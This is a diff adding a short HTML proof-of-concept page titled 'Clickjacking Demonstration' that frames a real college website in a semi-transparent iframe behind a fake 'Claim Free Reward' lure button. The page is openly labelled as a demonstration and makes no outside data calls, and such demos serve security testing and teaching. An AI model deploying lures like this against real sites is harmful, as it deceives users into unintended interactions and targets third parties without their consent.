@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking PoC</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 80px;
+    }
+
+    .fake-button {
+      display: inline-block;
+      padding: 15px 40px;
+      background: red;
+      color: white;
+      font-size: 22px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+      transition: 0.2s;
+    }
+
+    .fake-button:hover {
+      background: darkred;
+    }
+
+    iframe {
+      display: none; /* hidden at first */
+      margin-top: 40px;
+      width: 800px;
+      height: 500px;
+      border: 2px solid #333;
+      opacity: 0.3; /* transparent */
+    }
+  </style>
+</head>
+<body>
+  <h2>Clickjacking Demonstration</h2>
+  <p>Click the button below to claim your reward 👇</p>
+
+  <!-- Fake button -->
+  <div class="fake-button" onclick="showIframe()">🎁 Claim Free Reward</div>
+
+  <!-- Target site iframe (hidden until click) -->
+  <iframe id="targetFrame" src="https://seicomcollege.ac.in/"></iframe>
+
+  <script>
+    function showIframe() {
+      document.getElementById("targetFrame").style.display = "block";
+      alert("You thought you clicked the reward button, but you actually interacted with the hidden site!");
+    }
+  </script>
+</body>
+</html>
+
